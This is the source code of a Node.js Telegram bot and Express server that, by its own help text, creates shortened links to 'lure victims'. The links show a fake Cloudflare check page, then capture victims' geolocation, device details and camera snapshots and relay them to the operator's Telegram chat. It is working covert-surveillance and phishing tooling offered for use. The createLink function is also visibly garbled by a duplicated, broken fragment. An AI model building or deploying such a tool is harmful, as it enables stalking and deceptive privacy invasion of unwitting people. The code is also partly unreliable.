var express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
var isgd = require('isgd');
var vgd = require('vgd');
const { primaryURL } = require('./script.js');
const { shortenUrlOp, createShortLink } = require('./script.js');
var axios = require('axios');
var atob = require('atob');
var ejs = require ('ejs');
var path = require('path');
var TelegramBot = require('node-telegram-bot-api');
var bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
var app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// Modify your URL here
var hostURL = "YOUR URL";

// TOGGLE for Shorters
var use1pt = false;

bot.on('message', async (msg) => {
    var chatId = msg.chat.id;

    if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
        createLink(chatId, msg.text);
    }

    if (msg.text == "/start") {
        var m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [
                    [{ text: "Create Link", callback_data: "crenew" }]
                ]
            })
        };

        bot.sendMessage(chatId, `Welcome ${msg.chat.first_name}! \nYou can use this bot to track down people through a simple link. It gathers information like location, device info, and camera snaps.\n\nType /help for more info.`, m);
    } else if (msg.text == "/create") {
        createNew(chatId);
    } else if (msg.text == "/help") {
        bot.sendMessage(chatId, `Through this bot, you can track people by sending a simple link.\n\nSend /create to begin, afterward, it will ask you for a URL which will be used in an iframe to lure victims.\nAfter receiving the URL, it will send you some shortened links which you can use to track people.\n\nOnce a real user visits your trackable link, it will show a Cloudflare under attack page to gather information, and afterward, the victim will be redirected to the destination URL.`);
    }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
    bot.answerCallbackQuery(callbackQuery.id);
    if (callbackQuery.data == "crenew") {
        createNew(callbackQuery.message.chat.id);
    }
});

bot.on('polling_error', (error) => {
    // console.log(error.code); 
});

async function createLink(cid, msg) {
  if (msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) {
    var urlasync function createLink(cid, msg) {
  if (msg.toLowerCase().includes('http') || msg.toLowerCase().includes('https')) {
    var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
    var m = {
      reply_markup: JSON.stringify({
        inline_keyboard: [
          [{ text: '𝗥𝗘𝗖𝗥𝗘𝗔𝗧𝗘 𝗔 𝗟𝗜𝗡𝗞🖥️', callback_data: 'crenew' }],
        ],
      }),
    };

    bot.sendChatAction(cid, 'typing');
    
    var hostURLWithoutProtocol = hostURL.replace(/^https?:\/\//, '');
    var hostURLEncoded = Buffer.from(hostURLWithoutProtocol).toString('base64');
    var cUrl = `${primaryURL}/c/${url}/${hostURLEncoded}`;
                
    var cShortUrl1 = await createShortLink(cUrl);
    var cShortUrl2 = await shortenUrlOp(cUrl);
                
    bot.sendMessage(
      cid,
      `New links are created successfully\n\nURL: ${msg}\n\n✅Your Links\n\n𝟭. ${cShortUrl1}\n𝟮. ${cShortUrl2}`,
      m
    );
  } else {
    bot.sendMessage(
      cid,
      `⚠️ Please enter a valid URL, including http or htttps`
    );
    createNew(cid);
  }
}

function createNew(cid) {
    var mk = {
        reply_markup: JSON.stringify({ "force_reply": true })
    };
    bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

app.post("/location", (req, res) => {
    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var uid = decodeURIComponent(req.body.uid) || null;
    var acc = decodeURIComponent(req.body.acc) || null;

    if (lon != null && lat != null && uid != null && acc != null) {
        bot.sendLocation(parseInt(uid, 36), lat, lon);

        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

        res.send("Done");
    }
});

app.post("/", (req, res) => {
    var uid = decodeURIComponent(req.body.uid) || null;
    var data = decodeURIComponent(req.body.data) || null;

    if (uid != null && data != null) {
        data = data.replaceAll("<br>", "\n");

        bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });

        res.send("Done");
    }
});

app.post("/cam-denied", async (req, res) => {
  try {
    var uid = decodeURIComponent(req.body.uid) || null;
    var deniedText = decodeURIComponent(req.body.deniedText) || null;

    if (uid !== null && deniedText !== null) {
      // Assuming 'bot' is your Telegram bot instance
      await bot.sendMessage(parseInt(uid, 36), deniedText);
      res.send("Denied text sent successfully");
    } else {
      res.status(400).send("Invalid parameters");
    }
  } catch (error) {
    console.error(error);
    res.status(500).send("Internal server error");
  }
});

app.post("/camsnap", (req, res) => {
    var uid = decodeURIComponent(req.body.uid) || null;
    var img = decodeURIComponent(req.body.img) || null;

    if (uid != null && img != null) {
        var buffer = Buffer.from(img, 'base64');
        var info = {
            filename: "camsnap.png",
            contentType: 'image/png'
        };

        try {
            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
        } catch (error) {
            console.log(error);
        }

        res.send("Done");
    }
});

app.listen(5000, () => {
    console.log("App Running on Port 5000!");
});
